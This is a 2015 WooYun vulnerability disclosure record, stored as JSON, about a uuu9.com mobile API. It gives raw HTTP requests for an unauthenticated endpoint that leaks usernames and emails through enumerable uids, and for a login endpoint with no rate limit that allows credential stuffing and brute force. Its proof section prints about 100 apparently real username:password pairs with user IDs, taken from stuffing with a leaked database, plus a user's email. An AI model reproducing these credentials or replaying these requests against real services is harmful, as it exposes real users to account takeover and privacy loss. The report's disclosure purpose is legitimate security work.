{"id": 31595, "wybug_id": "wooyun-2015-0113584", "wybug_title": "游久网某接口设计不当可导致用户部分信息泄露(一千万)+撞库爆破", "wybug_corp": "uuu9.com", "wybug_author": "小手冰凉", "wybug_date": "2015-05-12 10:11", "wybug_open_date": "2015-06-26 10:42", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["信息泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-26：\t细节向公众公开  简要描述： 游久网某接口设计不当可导致用户部分信息泄露(一千万)+撞库爆破 详细说明：  看小满dota视频，最后推荐了一个游久的app，测试之....发现如下接口\nPOST /Member/info.html HTTP/1.1Content-Length: 61Content-Type: application/x-www-form-urlencodedHost: api.yoyo.uuu9.comConnection: Keep-AliveUser-Agent: android-async-http/1.4.3 (http://loopj.com/android-async-http)Accept-Encoding: gzipuid=12423778&onlymark=d8cc53dc-598a-3ec8-8875-cadaf3b20e01skk\n返回用户个数据信息\n{\"state\":1,\"info\":{\"username\":\"lqh47258\",\"email\":\"83640544@qq.com\",\"bg_1_link\":\"http:\\/\\/api.yoyo.uuu9.com\\/Public\\/background\\/default1.jpg?t=1431394782\",\"bg_2_link\":\"http:\\/\\/api.yoyo.uuu9.com\\/Public\\/background\\/default2.jpg?t=1431394782\",\"background\":1,\"bg_link\":\"http:\\/\\/api.yoyo.uuu9.com\\/Public\\/background\\/default1.jpg?t=1431394782?t=1431394782\",\"headimg\":\"http:\\/\\/u.uuu9.com\\/uct\\/avatar.php?uid=12423778&size=small1431394782\",\"gcount\":null,\"fcount\":null,\"ccount\":\"0\"}}\n测试发下这个uid可以遍历，从范围是（1-12423778） 一千万！！前几个是管理的用户，看用户名就能看出来 末尾随着注册人数的增加还在增加。有这么多用户？随机在这个范围内产生了一万个发现确实是真实用户数据。\n\n另外还发现了撞库爆破接口：\nPOST /Member/logintest.html HTTP/1.1Content-Length: 80Content-Type: application/x-www-form-urlencodedHost: api.yoyo.uuu9.comAccept-Encoding: identityusername=<用户名>&password=<明文密码>&onlymark=d8cc53dc-598a-3ec8-8875-cadaf3b20e01\n不仅能撞库，还能爆破，依然使用csdn库测试。   漏洞证明：  撞库部分结果(管理打码)\nmockmoon8336187:8336187asd\tuid:5007940ziyem4:19821220\tuid:1315505oetzi365:19831201\tuid:4299799cjlcjling:2590530cjl\tuid:3718539xj1988088:383854380\tuid:3077302hyf1129:19891129\tuid:7015413kingdomtbk:19851031\tuid:463588jenny8288:56133719\tuid:549655zengchihai:z61454654\tuid:3109949zenghaibo1989:zhb7221162\tuid:9515443crazy_demon:angelyys16\tuid:2460079heng19861229:heng1025\tuid:4901596wjwshmily:wangjiawei\tuid:1265276c_jianwu:103104103\tuid:4479645lzzeddy:liuzaizhe\tuid:3060429idiotddk:11111111\tuid:3574892free514689263:fnhmqj890912\tuid:4010947lx262853530:lx19891029\tuid:3295305q916613618:513148977\tuid:6746443himalayashf:hf19890408\tuid:2772770zuyfg520:19891106\tuid:5079172wenchongqi:19821020\tuid:2060863szyqita:zhiyong1986\tuid:3758154yanpingwan:sentimental\tuid:5553554snow9155:yanhan9155\tuid:4152779juy23174:juy1392010\tuid:1245955xixbnb:56770165\tuid:3389146wbc1988:1988414a\tuid:10023488tianrun2:55028006\tuid:994897fanss123:12354321\tuid:630019yechaoys:2576267YeChao\tuid:4158613jy3204183:hjwisatc\tuid:551692zh6486007:13802709418\tuid:2421168lubony:82250755\tuid:8264909iawpa:779042174\tuid:3461872htq19870607:53286566\tuid:1411383fairyilove:liuxianwan\tuid:3086253lengwing1:wingshadow\tuid:2457728maple0620:88499926\tuid:4411327hubeixuxi:hubei1988914\tuid:3497491tank39573:86868025\tuid:267117yxl1118:250103271\tuid:5147687yonghaoyip:199462112\tuid:2346989h357515283:19870824\tuid:3742181iceify:iceify_99\tuid:3831679ljg2353:23531420\tuid:3908969liuziyi708:850318108\tuid:4565277ad51241131:ad51241133\tuid:1178910hcc1989:arsenal0577\tuid:1714212gaiahc:22303712*\tuid:4637621chx19357:chenhx19357\tuid:3639413w174184047:68086390\tuid:4546860tony871018:tony5212129\tuid:1785540jy02192915:ly86710467\tuid:3951091txh100:steers19841122\tuid:4847243qiandai1988:huijiejie1988\tuid:1709544dawang117:qq123456\tuid:598327simoncxl:5845211314\tuid:4223670lgl198842:qweasd1214\tuid:3291243rk136283613:woshishe\tuid:2724497zhumashutou:258468895\tuid:1919266zxc129102:19941002\tuid:2285649wuyonglin1993:32201937\tuid:1060252luck5566:changeme\tuid:888217zl315524506:ymx5897665\tuid:4328202jianxing2001:gashnr54r\tuid:5132457jk2661809:1598753624\tuid:1956888fzg1994:526201344\tuid:1814302ll2921892:LWZL139791\tuid:2889071sunoosmile:zlxlyr988225\tuid:5025925newtangkai:tangkai3\tuid:6623387davewang1218:5242879qs\tuid:4177601hrq4399:qq000000\tuid:3417280z241116778:6354968200\tuid:3378486wannianzhilang:pipiaidag\tuid:5746376borty:19801210\tuid:706344zj1990222:hx1988919\tuid:2171430leek1987:lik1987229\tuid:1449751zhongyi_555:13868687332\tuid:3389151areyouaboy:youareaboy\tuid:3408614virgoviolet:19880427\tuid:5230352jk0411:68514355\tuid:3449360new11:12345678\tuid:2016084zhuasenven:senvenzhua\tuid:4230563gqllove:820834502\tuid:3583813swdefrgt:fbta11sj\tuid:3502244ilovesilc:50694208\tuid:2197073weee430:asd5526157\tuid:4610581qq864394800:866226770\tuid:4574883seven19871016:z1650232\tuid:3435368loverockxqb:19850821\tuid:4602251huxin987:84853668\tuid:4412797\n   修复方案：  增加验证防止信息泄露增加接口使用限制防止撞库爆破   版权声明：转载请注明来源 小手冰凉@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-05-12 10:41 厂商回复：  感谢提醒，已安排程序处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-05-12 10:15 |    \t\t小手冰凉 \t\t\t( 普通白帽子  |\t\t\t        Rank:174 漏洞数:18        | 幸福你我他)\t\t \n  no no no no no no 又是小厂商么？@疯狗 又没有打码么？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}